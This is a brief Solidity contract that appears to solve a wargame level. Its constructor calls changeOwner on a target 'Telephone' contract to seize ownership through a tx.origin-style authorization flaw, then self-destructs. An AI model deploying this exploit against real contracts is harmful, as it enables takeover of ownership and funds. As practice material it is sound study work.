// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

interface Telephone {
    function changeOwner(address _owner) external;
}

contract Hack {
    constructor (Telephone telephone, address payable newOwner) {
        telephone.changeOwner(newOwner);
        selfdestruct(newOwner);
    }
}
